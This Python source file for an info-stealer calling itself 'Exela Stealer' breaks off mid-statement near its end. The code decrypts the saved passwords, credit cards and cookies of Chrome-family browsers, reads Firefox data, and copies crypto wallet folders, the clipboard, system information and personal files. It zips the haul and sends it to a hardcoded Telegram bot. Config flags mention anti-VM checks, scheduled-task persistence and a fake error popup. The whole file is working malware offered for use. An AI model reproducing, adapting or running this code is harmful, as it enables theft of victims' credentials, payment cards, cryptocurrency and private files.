import ctypes
import platform
import json
import sys
import shutil
import sqlite3
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import re
import os
import asyncio
import aiohttp
import base64
import time
import logging

# Настройка логирования
logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

# Telegram настройки
TELEGRAM_TOKEN = "8234698954:AAHssgvq8RlDMM1Nw3MVQkvDUrPz944S4Oo"
TELEGRAM_CHAT_ID = "-1002882655099"
STARTUP_METHOD = "schtasks"
ANTI_VM = True
FAKE_ERROR = (True, ("System Error", "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem", 0))
STEAL_FILES = True

class Variables:
    Passwords = []
    Cards = []
    Cookies = []
    Historys = []
    Downloads = []
    Autofills = []
    Bookmarks = []
    SystemInfo = []
    ClipBoard = []
    Network = []

class SubModules:
    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str = None) -> bytes:
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]

        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None

        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode("utf-16")
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)
        raise ValueError("Invalid encrypted_data provided!")

    @staticmethod
    def GetKey(FilePath: str) -> bytes:
        try:
            with open(FilePath, "r", encoding="utf-8", errors="ignore") as file:
                jsonContent = json.load(file)
            encryptedKey = jsonContent["os_crypt"]["encrypted_key"]
            encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
            return SubModules.CryptUnprotectData(encryptedKey)
        except Exception as e:
            logging.error(f"Error getting key from {FilePath}: {e}")
            return b""

    @staticmethod
    def Decrpytion(EncrypedValue: bytes, EncryptedKey: bytes) -> str:
        try:
            version = EncrypedValue[:3].decode(errors="ignore")
            if version.startswith(("v10", "v11")):
                iv = EncrypedValue[3:15]
                password = EncrypedValue[15:-16]
                authentication_tag = EncrypedValue[-16:]
                cipher = Cipher(algorithms.AES(EncryptedKey), modes.GCM(iv, authentication_tag), backend=default_backend())
                decryptor = cipher.decryptor()
                decrypted_password = decryptor.update(password) + decryptor.finalize()
                return decrypted_password.decode('utf-8')
            return str(SubModules.CryptUnprotectData(EncrypedValue))
        except Exception as e:
            logging.error(f"Decryption error: {e}")
            return "Decryption Error!"

    @staticmethod
    def create_mutex(mutex_value) -> bool:
        try:
            kernel32 = ctypes.windll.kernel32
            mutex = kernel32.CreateMutexA(None, False, mutex_value)
            return kernel32.GetLastError() != 183
        except Exception as e:
            logging.error(f"Error creating mutex: {e}")
            return False

    @staticmethod
    def IsAdmin() -> bool:
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception as e:
            logging.error(f"Error checking admin status: {e}")
            return False

class StealSystemInformation:
    async def FunctionRunner(self) -> None:
        try:
            tasks = [
                asyncio.create_task(self.StealSystemInformation()),
                asyncio.create_task(self.StealLastClipBoard()),
                asyncio.create_task(self.StealNetworkInformation()),
            ]
            await asyncio.gather(*tasks)
        except Exception as e:
            logging.error(f"Error running system information tasks: {e}")

    async def GetDefaultSystemEncoding(self) -> str:
        try:
            cmd = "cmd.exe /c chcp"
            process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, _ = await process.communicate()
            return stdout.decode(errors="ignore").split(":")[1].strip()
        except Exception as e:
            logging.error(f"Error getting system encoding: {e}")
            return "utf-8"

    async def StealSystemInformation(self) -> None:
        try:
            print("[+] Stealing system information")
            current_code_page = await self.GetDefaultSystemEncoding()
            cmd = (
                r'echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & '
                r'echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & '
                r'echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & '
                r'echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & '
                r'echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & '
                r'echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & '
                r'echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & '
                r'echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config'
            )
            process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, _ = await process.communicate()
            Variables.SystemInfo.append(stdout.decode(current_code_page, errors="ignore"))
            print("[+] System information successfully stolen")
        except Exception as e:
            logging.error(f"Error stealing system information: {e}")

    async def StealLastClipBoard(self) -> None:
        try:
            print("[+] Stealing last clipboard text")
            process = await asyncio.create_subprocess_shell(
                "powershell.exe Get-Clipboard",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, _ = await process.communicate()
            if stdout:
                Variables.ClipBoard.append(stdout.decode(errors="ignore"))
            print("[+] Last clipboard text successfully stolen")
        except Exception as e:
            logging.error(f"Error stealing clipboard: {e}")

    async def StealNetworkInformation(self) -> None:
        try:
            print("[+] Stealing network information")
            async with aiohttp.ClientSession() as session:
                async with session.get("http://ip-api.com/json") as response:
                    data = await response.json()
                    ip = data.get("query", "Unknown")
                    country = data.get("country", "Unknown")
                    city = data.get("city", "Unknown")
                    timezone = data.get("timezone", "Unknown")
                    isp_info = f"{data.get('isp', 'Unknown')} {data.get('org', '')} {data.get('as', '')}"
                    Variables.Network.append((ip, country, city, timezone, isp_info))
            print("[+] Network information successfully stolen")
        except Exception as e:
            logging.error(f"Error stealing network information: {e}")

class Main:
    def __init__(self) -> None:
        self.profiles_full_path = []
        self.RoamingAppData = os.getenv('APPDATA')
        self.LocalAppData = os.getenv('LOCALAPPDATA')
        self.Temp = os.getenv('TEMP')
        self.FireFox = False
        self.FirefoxFilesFullPath = []
        self.FirefoxCookieList = []
        self.FirefoxHistoryList = []
        self.FirefoxAutofiList = []

    async def FunctionRunner(self):
        await self.kill_browsers()
        self.list_profiles()
        self.ListFirefoxProfiles()
        tasks = [
            asyncio.create_task(self.GetPasswords()),
            asyncio.create_task(self.GetCards()),
            asyncio.create_task(self.GetCookies()),
            asyncio.create_task(self.GetFirefoxCookies()),
            asyncio.create_task(self.GetHistory()),
            asyncio.create_task(self.GetFirefoxHistorys()),
            asyncio.create_task(self.GetDownload()),
            asyncio.create_task(self.GetBookMark()),
            asyncio.create_task(self.GetAutoFill()),
            asyncio.create_task(self.GetFirefoxAutoFills()),
            asyncio.create_task(self.GetWallets()),
            asyncio.create_task(StealSystemInformation().FunctionRunner())
        ]
        await asyncio.gather(*tasks)
        await self.WriteToText()
        await self.SendAllData()

    def list_profiles(self) -> None:
        directories = {
            'Google Chrome': os.path.join(self.LocalAppData, "Google", "Chrome", "User Data"),
            'Opera': os.path.join(self.RoamingAppData, "Opera Software", "Opera Stable"),
            'Opera GX': os.path.join(self.RoamingAppData, "Opera Software", "Opera GX Stable"),
            'Brave': os.path.join(self.LocalAppData, "BraveSoftware", "Brave-Browser", "User Data"),
            'Edge': os.path.join(self.LocalAppData, "Microsoft", "Edge", "User Data"),
        }
        for _, directory in directories.items():
            if os.path.isdir(directory):
                if "Opera" in directory:
                    self.profiles_full_path.append(directory)
                else:
                    for root, folders, _ in os.walk(directory):
                        for folder in folders:
                            folder_path = os.path.join(root, folder)
                            if folder == 'Default' or folder.startswith('Profile') or "Guest Profile" in folder:
                                self.profiles_full_path.append(folder_path)

    def ListFirefoxProfiles(self) -> None:
        try:
            directory = os.path.join(self.RoamingAppData, "Mozilla", "Firefox", "Profiles")
            if os.path.isdir(directory):
                for root, _, files in os.walk(directory):
                    for file in files:
                        file_path = os.path.join(root, file)
                        if file.endswith(("cookies.sqlite", "places.sqlite", "formhistory.sqlite")):
                            self.FirefoxFilesFullPath.append(file_path)
        except Exception as e:
            logging.error(f"Error listing Firefox profiles: {e}")

    async def kill_browsers(self):
        process_names = ["chrome.exe", "opera.exe", "edge.exe", "firefox.exe", "brave.exe"]
        try:
            for process_name in process_names:
                process = await asyncio.create_subprocess_shell(
                    f'taskkill /F /IM {process_name}',
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await process.communicate()
                if stderr:
                    logging.error(f"Error killing {process_name}: {stderr.decode(errors='ignore')}")
                else:
                    print(f"[+] Killed process {process_name}")
        except Exception as e:
            logging.error(f"Error killing browsers: {e}")
            print(f"[+] ERROR: Error killing browsers: {e}")

    async def GetFirefoxCookies(self) -> None:
        try:
            for file in self.FirefoxFilesFullPath:
                if "cookies.sqlite" in file:
                    with sqlite3.connect(file) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT host, name, path, value, expiry FROM moz_cookies')
                        for cookie in cursor.fetchall():
                            self.FirefoxCookieList.append(
                                f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t"
                                f"{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cookie[3]}\n"
                            )
            self.FireFox = True
        except Exception as e:
            logging.error(f"Error getting Firefox cookies: {e}")

    async def GetFirefoxHistorys(self) -> None:
        try:
            for file in self.FirefoxFilesFullPath:
                if "places.sqlite" in file:
                    with sqlite3.connect(file) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT id, url, title, visit_count, last_visit_date FROM moz_places')
                        for history in cursor.fetchall():
                            self.FirefoxHistoryList.append(
                                f"ID: {history[0]}\nURL: {history[1]}\nTitle: {history[2]}\nVisit Count: {history[3]}\n"
                                f"Last Visit Time: {history[4]}\n====================================================================================\n"
                            )
            self.FireFox = True
        except Exception as e:
            logging.error(f"Error getting Firefox history: {e}")

    async def GetFirefoxAutoFills(self) -> None:
        try:
            for file in self.FirefoxFilesFullPath:
                if "formhistory.sqlite" in file:
                    with sqlite3.connect(file) as conn:
                        cursor = conn.cursor()
                        cursor.execute("SELECT * FROM moz_formhistory")
                        for autofill in cursor.fetchall():
                            self.FirefoxAutofiList.append(f"{autofill}\n")
            self.FireFox = True
        except Exception as e:
            logging.error(f"Error getting Firefox autofills: {e}")

    async def GetPasswords(self) -> None:
        try:
            for path in self.profiles_full_path:
                BrowserName = "None"
                index = path.find("User Data")
                user_data_part = path if "Opera" in path else path[:index + len("User Data")]
                BrowserName = "Opera" if "Opera" in path else path.split("\\")[-4] + " " + path.split("\\")[-3]
                key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                if not key:
                    continue
                LoginData = os.path.join(path, "Login Data")
                copied_file_path = os.path.join(self.Temp, "Logins.db")
                if os.path.exists(LoginData):
                    shutil.copyfile(LoginData, copied_file_path)
                    with sqlite3.connect(copied_file_path) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                        for login in cursor.fetchall():
                            if login[0] and login[1] and login[2]:
                                Variables.Passwords.append(
                                    f"URL: {login[0]}\nUsername: {login[1]}\nPassword: {SubModules.Decrpytion(login[2], key)}\n"
                                    f"Browser: {BrowserName}\n======================================================================\n"
                                )
                    os.remove(copied_file_path)
        except Exception as e:
            logging.error(f"Error getting passwords: {e}")

    async def GetCards(self) -> None:
        try:
            for path in self.profiles_full_path:
                index = path.find("User Data")
                user_data_part = path if "Opera" in path else path[:index + len("User Data")]
                key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                if not key:
                    continue
                WebData = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "Web.db")
                if os.path.exists(WebData):
                    shutil.copyfile(WebData, copied_file_path)
                    with sqlite3.connect(copied_file_path) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT card_number_encrypted, expiration_year, expiration_month, name_on_card FROM credit_cards')
                        for card in cursor.fetchall():
                            month = f"0{card[2]}" if card[2] < 10 else str(card[2])
                            Variables.Cards.append(f"{SubModules.Decrpytion(card[0], key)}\t{month}/{card[1]}\t{card[3]}\n")
                    os.remove(copied_file_path)
        except Exception as e:
            logging.error(f"Error getting cards: {e}")

    async def GetCookies(self) -> None:
        try:
            for path in self.profiles_full_path:
                BrowserName = "None"
                index = path.find("User Data")
                user_data_part = path if "Opera" in path else path[:index + len("User Data")]
                BrowserName = "Opera" if "Opera" in path else path.split("\\")[-4] + " " + path.split("\\")[-3]
                key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                if not key:
                    continue
                CookieData = os.path.join(path, "Network", "Cookies")
                copied_file_path = os.path.join(self.Temp, "Cookies.db")
                if os.path.exists(CookieData):
                    shutil.copyfile(CookieData, copied_file_path)
                    with sqlite3.connect(copied_file_path) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
                        for cookie in cursor.fetchall():
                            dec_cookie = SubModules.Decrpytion(cookie[3], key)
                            Variables.Cookies.append(
                                f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t"
                                f"{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{dec_cookie}\n"
                            )
                    os.remove(copied_file_path)
        except Exception as e:
            logging.error(f"Error getting cookies: {e}")

    async def GetWallets(self) -> None:
        try:
            wallets_ext_names = {
                "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
                "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
                "Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
                "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
                "Ronin": "fnjhmkhhmkbjkkabndcnnogagogbneec",
                "Exodus": "aholpfdialjgjfhomihkjbmgjidlcdno",
                "Coin98": "aeachknmefphepccionboohckonoeemg",
                "KardiaChain": "pdadjkfkgcafgbceimcpbkalnfnepbnk",
                "TerraStation": "aiifbnbfobpmeekipheeijimdpnlpgpp",
                "Wombat": "amkmjjmmflddogmhpjloimipbofnfjih",
                "Harmony": "fnnegphlobjdpkhecapkijjdkgcjhkib",
                "Nami": "lpfcbjknijpeeillifnkikgncikgfhdo",
                "MartianAptos": "efbglgofoippbgcjepnhiblaibcnclgk",
                "Braavos": "jnlgamecbpmbajjfhmmmlhejkemejdma",
                "XDEFI": "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
                "Yoroi": "ffnbelfdoeiohenkjibnmadjiehjhajb",
                "TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",
                "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
                "MetaMask_Edge": "ejbalbakoplchlghecdalmeeeajnimhm",
                "Tron": "ibnejdfjmmkpcnlpebklmnkoeoihofec",
            }
            wallet_local_paths = {
                "Bitcoin": os.path.join(self.RoamingAppData, "Bitcoin", "wallets"),
                "Zcash": os.path.join(self.RoamingAppData, "Zcash"),
                "Armory": os.path.join(self.RoamingAppData, "Armory"),
                "Bytecoin": os.path.join(self.RoamingAppData, "bytecoin"),
                "Jaxx": os.path.join(self.RoamingAppData, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
                "Exodus": os.path.join(self.RoamingAppData, "Exodus", "exodus.wallet"),
                "Ethereum": os.path.join(self.RoamingAppData, "Ethereum", "keystore"),
                "Electrum": os.path.join(self.RoamingAppData, "Electrum", "wallets"),
                "AtomicWallet": os.path.join(self.RoamingAppData, "atomic", "Local Storage", "leveldb"),
                "Guarda": os.path.join(self.RoamingAppData, "Guarda", "Local Storage", "leveldb"),
                "Coinomi": os.path.join(self.RoamingAppData, "Coinomi", "Coinomi", "wallets"),
            }
            copied_path = os.path.join(self.Temp, "StolenData")
            os.makedirs(os.path.join(copied_path, "Wallets"), exist_ok=True)
            for path in self.profiles_full_path:
                ext_path = os.path.join(path, "Local Extension Settings")
                if os.path.exists(ext_path):
                    for wallet_name, wallet_addr in wallets_ext_names.items():
                        wallet_path = os.path.join(ext_path, wallet_addr)
                        if os.path.isdir(wallet_path):
                            try:
                                file_name = f"{path.split(os.sep)[-3]} {path.split(os.sep)[-2]} {wallet_name}"
                                os.makedirs(os.path.join(copied_path, "Wallets", file_name), exist_ok=True)
                                shutil.copytree(wallet_path, os.path.join(copied_path, "Wallets", file_name, wallet_addr))
                            except Exception as e:
                                logging.error(f"Error copying wallet {wallet_name}: {e}")
            for wallet_name, wallet_path in wallet_local_paths.items():
                if os.path.exists(wallet_path):
                    try:
                        shutil.copytree(wallet_path, os.path.join(copied_path, "Wallets", wallet_name))
                    except Exception as e:
                        logging.error(f"Error copying local wallet {wallet_name}: {e}")
        except Exception as e:
            logging.error(f"Error stealing wallets: {e}")

    async def GetHistory(self) -> None:
        try:
            for path in self.profiles_full_path:
                HistoryData = os.path.join(path, "History")
                copied_file_path = os.path.join(self.Temp, "HistoryData.db")
                if os.path.exists(HistoryData):
                    shutil.copyfile(HistoryData, copied_file_path)
                    with sqlite3.connect(copied_file_path) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT id, url, title, visit_count, last_visit_time FROM urls')
                        for history in cursor.fetchall():
                            Variables.Historys.append(
                                f"ID: {history[0]}\nURL: {history[1]}\nTitle: {history[2]}\nVisit Count: {history[3]}\n"
                                f"Last Visit Time: {history[4]}\n====================================================================================\n"
                            )
                    os.remove(copied_file_path)
        except Exception as e:
            logging.error(f"Error getting history: {e}")

    async def GetAutoFill(self) -> None:
        try:
            for path in self.profiles_full_path:
                AutofillData = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "AutofillData.db")
                if os.path.exists(AutofillData):
                    shutil.copyfile(AutofillData, copied_file_path)
                    with sqlite3.connect(copied_file_path) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT * FROM autofill')
                        for autofill in cursor.fetchall():
                            if autofill:
                                Variables.Autofills.append(f"{autofill}\n")
                    os.remove(copied_file_path)
        except Exception as e:
            logging.error(f"Error getting autofill: {e}")

    async def GetBookMark(self) -> None:
        try:
            for path in self.profiles_full_path:
                BookmarkData = os.path.join(path, "Bookmarks")
                if os.path.isfile(BookmarkData):
                    with open(BookmarkData, "r", encoding="utf-8", errors="ignore") as file:
                        data = json.load(file)
                    bookmarks = data.get("roots", {}).get("bookmark_bar", {}).get("children", [])
                    for bookmark in bookmarks:
                        Variables.Bookmarks.append(
                            f"Browser Path: {path}\nID: {bookmark.get('id', 'N/A')}\nName: {bookmark.get('name', 'N/A')}\n"
                            f"URL: {bookmark.get('url', 'N/A')}\nGUID: {bookmark.get('guid', 'N/A')}\n"
                            f"Added At: {bookmark.get('date_added', 'N/A')}\n\n=========================================================\n"
                        )
        except Exception as e:
            logging.error(f"Error getting bookmarks: {e}")

    async def GetDownload(self) -> None:
        try:
            for path in self.profiles_full_path:
                DownloadData = os.path.join(path, "History")
                copied_file_path = os.path.join(self.Temp, "DownloadData.db")
                if os.path.exists(DownloadData):
                    shutil.copyfile(DownloadData, copied_file_path)
                    with sqlite3.connect(copied_file_path) as conn:
                        cursor = conn.cursor()
                        cursor.execute('SELECT tab_url, target_path FROM downloads')
                        for download in cursor.fetchall():
                            Variables.Downloads.append(f"Downloaded URL: {download[0]}\nDownloaded Path: {download[1]}\n\n")
                    os.remove(copied_file_path)
        except Exception as e:
            logging.error(f"Error getting downloads: {e}")

    async def WriteToText(self) -> None:
        try:
            filePath = os.path.join(self.Temp, "StolenData")
            os.makedirs(os.path.join(filePath, "Browsers"), exist_ok=True)
            if self.FireFox:
                os.makedirs(os.path.join(filePath, "Browsers", "Firefox"), exist_ok=True)

            if Variables.ClipBoard:
                with open(os.path.join(filePath, "last_clipboard.txt"), "w", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------Exela Stealer----------------------\n" + "=" * 70 + "\n")
                    for clip in Variables.ClipBoard:
                        file.write(clip)

            if self.FirefoxCookieList:
                with open(os.path.join(filePath, "Browsers", "Firefox", "Cookies.txt"), "w", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------Exela Stealer----------------------\n" + "=" * 70 + "\n")
                    for fcookie in self.FirefoxCookieList:
                        file.write(fcookie)

            if self.FirefoxHistoryList:
                with open(os.path.join(filePath, "Browsers", "Firefox", "History.txt"), "w", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------Exela Stealer----------------------\n" + "=" * 70 + "\n")
                    for fhistory in self.FirefoxHistoryList:
                        file.write(fhistory)

            if self.FirefoxAutofiList:
                with open(os.path.join(filePath, "Browsers", "Firefox", "Autofills.txt"), "w", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------Exela Stealer----------------------\n" + "=" * 70 + "\n")
                    for fautofill in self.FirefoxAutofiList:
                        file.write(fautofill)

            if Variables.Passwords:
                with open(os.path.join(filePath, "Browsers", "Passwords.txt"), "w", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------Exela Stealer----------------------\n" + "=" * 70 + "\n")
                    for password in Variables.Passwords:
                        file.write(password)

            if Variables.Cards:
                with open(os.path.join(filePath, "Browsers", "Cards.txt"), "w", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------Exela Stealer----------------------\n" + "=" * 70 + "\n")
                    for card in Variables.Cards:
                        file.write(card)

            if Variables.Cookies:
                with open(os.path.join(filePath, "Browsers", "Cookies.txt"), "w", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------Exela Stealer----------------------\n" + "=" * 70 + "\n")
                    for cookie in Variables.Cookies:
                        file.write(cookie)

            if Variables.Historys:
                with open(os.path.join(filePath, "Browsers", "History.txt"), "w", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------Exela Stealer----------------------\n" + "=" * 70 + "\n")
                    for history in Variables.Historys:
                        file.write(history)

            if Variables.Autofills:
                with open(os.path.join(filePath, "Browsers", "Autofills.txt"), "w", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------Exela Stealer----------------------\n" + "=" * 70 + "\n")
                    for autofill in Variables.Autofills:
                        file.write(autofill)

            if Variables.Bookmarks:
                with open(os.path.join(filePath, "Browsers", "Bookmarks.txt"), "w", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------Exela Stealer----------------------\n" + "=" * 70 + "\n")
                    for bookmark in Variables.Bookmarks:
                        file.write(bookmark)

            if Variables.Downloads:
                with open(os.path.join(filePath, "Browsers", "Downloads.txt"), "w", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------Exela Stealer----------------------\n" + "=" * 70 + "\n")
                    for download in Variables.Downloads:
                        file.write(download)

            if Variables.SystemInfo:
                with open(os.path.join(filePath, "system_info.txt"), "w", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------Exela Stealer----------------------\n" + "=" * 70 + "\n")
                    for systeminfo in Variables.SystemInfo:
                        file.write(systeminfo)

            if Variables.Network:
                with open(os.path.join(filePath, "network_info.txt"), "w", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------Exela Stealer----------------------\n" + "=" * 70 + "\n")
                    for ip, country, city, timezone, isp in Variables.Network:
                        file.write(f"{ip}\n{country}\n{city}\n{timezone}\n{isp}\n")
        except Exception as e:
            logging.error(f"Error writing to text files: {e}")

    async def SendAllData(self) -> None:
        try:
            cmd = "wmic csproduct get uuid"
            process = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True
            )
            stdout, stderr = await process.communicate()
            uuid = stdout.decode(errors="ignore").split("\n")[1].strip() if len(stdout.decode().split("\n")) > 1 else "NONE"
            print(f"[+] UUID: {uuid}")
            filePath = os.path.join(self.Temp, "StolenData")
            zip_path = filePath + ".zip"
            print(f"[+] Attempting to create ZIP archive at {zip_path}")
            try:
                shutil.make_archive(filePath, "zip", filePath)
                if not os.path.exists(zip_path):
                    logging.error(f"ZIP file {zip_path} was not created")
                    print(f"[+] ERROR: ZIP file {zip_path} was not created")
                    return
                zip_size = os.path.getsize(zip_path) / (1024 * 1024)
                print(f"[+] ZIP archive created, size: {zip_size:.2f} MB")
            except Exception as e:
                logging.error(f"Error creating ZIP archive: {e}")
                print(f"[+] ERROR: Error creating ZIP archive: {e}")
                return

            message = (
                f"***Exela Stealer Full Info***\n\n"
                f"Password: {len(Variables.Passwords)}\n"
                f"Card: {len(Variables.Cards)}\n"
                f"Cookie: {len(Variables.Cookies) + len(self.FirefoxCookieList)}\n"
                f"History: {len(Variables.Historys) + len(self.FirefoxHistoryList)}\n"
                f"Download: {len(Variables.Downloads)}\n"
                f"Bookmark: {len(Variables.Bookmarks)}\n"
                f"Autofill: {len(Variables.Autofills) + len(self.FirefoxAutofiList)}\n"
                f"Firefox?: {self.FireFox}"
            )
            print(f"[+] Sending message to Telegram: {message}")

            async with aiohttp.ClientSession() as session:
                print("[+] Sending text message to Telegram")
                async with session.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                    json={"chat_id": TELEGRAM_CHAT_ID, "text": message}
                ) as response:
                    response_text = await response.text()
                    print(f"[+] Telegram message response: {response_text}")

                if zip_size < 50:
                    print("[+] Sending ZIP file to Telegram")
                    try:
                        with open(zip_path, 'rb') as file:
                            form = aiohttp.FormData()
                            form.add_field('chat_id', TELEGRAM_CHAT_ID)
                            form.add_field('document', file, filename=f"{uuid}.zip")
                            async with session.post(
                                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                                data=form
                            ) as response:
                                response_text = await response.text()
                                print(f"[+] Telegram file response: {response_text}")
                    except Exception as e:
                        logging.error(f"Error sending ZIP to Telegram: {e}")
                        print(f"[+] ERROR: Error sending ZIP to Telegram: {e}")
                else:
                    print("[+] ZIP file too large, saving locally: {zip_path}")
                    print(f"[+] Large ZIP file saved locally at {zip_path}")

            try:
                if zip_size < 50:  # Удаляем только если не слишком большой
                    os.remove(zip_path)
                    shutil.rmtree(filePath)
                    print("[+] Cleaned up temporary files")
                else:
                    print(f"[+] Large ZIP file saved locally at {zip_path}")
            except Exception as e:
                logging.error(f"Error cleaning up files: {e}")
                print(f"[+] ERROR: Error cleaning up files: {e}")
        except Exception as e:
            logging.error(f"Error sending data: {e}")
            print(f"[+] ERROR: Error sending data: {e}")

class UploadGoFile:
    @staticmethod
    async def GetServer() -> str:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://api.gofile.io/getServer") as request:
                    data = await request.json()
                    return data["data"]["server"]
        except Exception as e:
            logging.error(f"Error getting GoFile server: {e}")
            return "store1"

    @staticmethod
    async def upload_file(file_path: str) -> str:
        try:
            server = await UploadGoFile.GetServer()
            upload_url = f"https://{server}.gofile.io/uploadFile"
            async with aiohttp.ClientSession() as session:
                with open(file_path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(file_path))
                    async with session.post(upload_url, data=form) as response:
                        data = await response.json()
                        return data['data']['downloadPage']
        except Exception as e:
            logging.error(f"Error uploading file to GoFile: {e}")
            return None

class StealCommonFiles:
    def __init__(self) -> None:
        self.temp = os.getenv("temp")

    async def StealFiles(self) -> None:
        try:
            source_directories = (
                ("Desktop", os.path.join(os.getenv("userprofile"), "Desktop")),
                ("Desktop2", os.path.join(os.getenv("userprofile"), "OneDrive", "Desktop")),
                ("Pictures", os.path.join(os.getenv("userprofile"), "Pictures")),
                ("Documents", os.path.join(os.getenv("userprofile"), "Documents")),
                ("Music", os.path.join(os.getenv("userprofile"), "Music")),
                ("Videos", os.path.join(os.getenv("userprofile"), "Videos")),
                ("Downloads", os.path.join(os.getenv("userprofile"), "Downloads")),
            )
            destination_directory = os.path.join(self.temp, "StealedFilesByExela")
            os.makedirs(destination_directory, exist_ok=True)

            keywords = ["secret", "password", "account", "tax", "key", "wallet", "backup"]
            allowed_extensions = [".txt", ".doc", ".docx", ".png", ".pdf", ".jpg", ".jpeg", ".csv", ".mp3", ".mp4", ".xls", ".xlsx", ".zip"]

            for _, source_path in source_directories:
                if os.path.isdir(source_path):
                    for folder_path, _, files in os.walk(source_path):
                        for file_name in files:
                            file_path = os.path.join(folder_path, file_name)
                            _, file_extension = os.path.splitext(file_name)
                            if (
                                file_extension.lower() in allowed_extensions
                                and os.path.getsize(file_path) < 2 * 1024 * 1024
                                or any(keyword in file_name.lower() for keyword in keywords)
                            ):
                                source_folder_name = os.path.basename(os.path.normpath(folder_path))
                                destination_folder_path = os.path.join(destination_directory, source_folder_name)
                                os.makedirs(destination_folder_path, exist_ok=True)
                                destination_path = os.path.join(destination_folder_path, file_name)
                                shutil.copy2(file_path, destination_path)

            zip_path = destination_directory + ".zip"
            shutil.make_archive(destination_directory, 'zip', destination_directory)
            async with aiohttp.ClientSession() as session:
                if os.path.getsize(zip_path) / (1024 * 1024) < 50:
                    with open(zip_path, 'rb') as file:
                        form = aiohttp.FormData()
                        form.add_field('chat_id', TELEGRAM_CHAT_ID)
                        form.add_field('document', file, filename="Files.zip")
                        await session.post(
